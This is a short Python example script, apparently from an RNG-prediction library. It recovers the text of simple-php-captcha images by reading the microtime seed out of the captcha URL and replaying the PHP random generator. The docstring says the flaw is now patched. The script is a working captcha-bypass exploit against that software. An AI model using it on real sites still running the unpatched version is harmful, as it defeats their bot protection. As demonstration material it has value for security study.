""" This example demonstrates the usage of 'from_seed' to predict outputs
from the 'simple-php-captcha' (https://github.com/claviska/simple-php-captcha/),
which has now been patched. Before patch, the PHP RNG was seeded each time a
captcha was generated. This seed was the current 'microtime', which was also
revealed in the captcha URL. This program predicts the captcha text from
the URL.

Note that this example assumes PHP is running on linux (or was compiled
with something using glibc)
"""

from foresight.php import rand


def main():
    CHARACTERS = "ABCDEFGHJKLMNPRSTUVWXYZabcdefghjkmnprstuvwxyz23456789"
    url = input("url: ")
    microtime = url.split("&t=")[1]
    seconds = microtime.split("+")[0]
    time = int(float(seconds)*100)  # seed is in milliseconds

    gen = rand.from_seed(time, platform="linux")

    next(gen) # one call is used to determine the number of characters (always 5 by default)
    for _ in range(5):
        print(CHARACTERS[next(gen) % len(CHARACTERS)], end="")
    print()


if __name__ == "__main__":
    main()
